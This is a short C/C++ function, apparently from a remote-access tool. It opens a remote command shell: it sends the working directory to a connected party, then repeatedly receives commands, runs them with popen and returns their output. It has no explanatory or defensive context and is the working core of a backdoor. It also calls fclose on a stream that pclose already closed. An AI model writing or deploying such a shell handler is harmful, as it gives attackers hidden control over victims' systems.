void RemoteCMD()
{
    sendall(getcwd(buffer, sizeof(buffer)));

    string data;
    FILE* stream;

    while (true)
    {
        string command = recvall(getBufferSize());
        if (command == "exit" || command == "error") return;

        command.append(" 2>&1");
        stream = popen(command.c_str(), "r");

        if (stream) {
            while (!feof(stream))
            if (fgets(buffer, sizeof(buffer), stream) != NULL) {
                data.append(buffer);
            
            } pclose(stream);
        
        } sendall(data); data.clear();
    
    } fclose(stream);
}